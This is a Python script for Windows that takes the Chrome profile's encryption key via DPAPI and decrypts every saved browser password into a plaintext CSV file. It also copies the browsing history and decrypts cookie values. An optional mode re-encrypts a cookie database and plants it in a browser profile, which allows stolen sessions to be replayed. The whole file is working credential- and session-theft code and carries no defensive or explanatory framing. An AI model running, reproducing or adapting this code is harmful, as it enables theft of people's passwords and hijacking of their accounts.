import os
import csv
import json
import base64
import shutil
import sqlite3
import argparse
import win32crypt
from Cryptodome.Cipher import AES

parser = argparse.ArgumentParser()
parser.add_argument("-e", action="store_true")
parser.add_argument("-b", default=r"Google\Chrome")
args = parser.parse_args()
chrome = fr"{os.environ["USERPROFILE"]}\AppData\Local\{args.b}\User Data"
cookies = fr"{chrome}\Default\Network\Cookies"

with open(fr"{chrome}\Local State") as f:
    k = json.loads(f.read())["os_crypt"]["encrypted_key"]
# decode base64
k = base64.b64decode(k)[5:]
# decrypt dpapi
k = win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]

if args.e:
    shutil.move(cookies, f"{cookies}.bak")
    shutil.copy2("cookies.db", cookies)

    con = sqlite3.connect(cookies)
    cur = con.cursor()
    cur.execute("select rowid, encrypted_value from cookies")
    for x, y in cur.fetchall():
        if not y: continue
        iv = os.urandom(12)
        cipher = AES.new(k, AES.MODE_GCM, iv)
        ciphertext, tag = cipher.encrypt_and_digest(y.encode())
        encrypted_value = b"v10%b%b%b" % (iv, ciphertext, tag)
        cur.execute("update cookies set encrypted_value=? where rowid=?", (encrypted_value, x))
    con.commit()
    con.close()
else:
    shutil.copy2(cookies, "cookies.db")
    shutil.copy2(fr"{chrome}\Default\History", "history.db")
    shutil.copy2(fr"{chrome}\Default\Login Data", "logins.db")

    con = sqlite3.connect("logins.db")
    cur = con.cursor()
    cur.execute("select action_url, username_value, password_value from logins")
    n = 0
    with open("logins.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["id", "url", "username", "password"])
        for x, y, z in cur.fetchall():
            if not x or not y or not z: continue
            n += 1
            iv = z[3:15]
            z = z[15:-16]
            cipher = AES.new(k, AES.MODE_GCM, iv)
            # decrypt aes
            z = cipher.decrypt(z).decode()
            writer.writerow([n, x, y, z])
    con.close()
    os.remove("logins.db")
    print(f"key: {k}\npasswords: {n}")

    con = sqlite3.connect("cookies.db")
    cur = con.cursor()
    cur.execute("select rowid, encrypted_value from cookies")
    n = 0
    for x, y in cur.fetchall():
        if not y: continue
        n += 1
        iv = y[3:15]
        ciphertext = y[15:-16]
        cipher = AES.new(k, AES.MODE_GCM, iv)
        ciphertext = cipher.decrypt(ciphertext).decode()
        cur.execute("update cookies set encrypted_value=? where rowid=?", (ciphertext, x))
    con.commit()
    con.close()
    print("cookies:", n)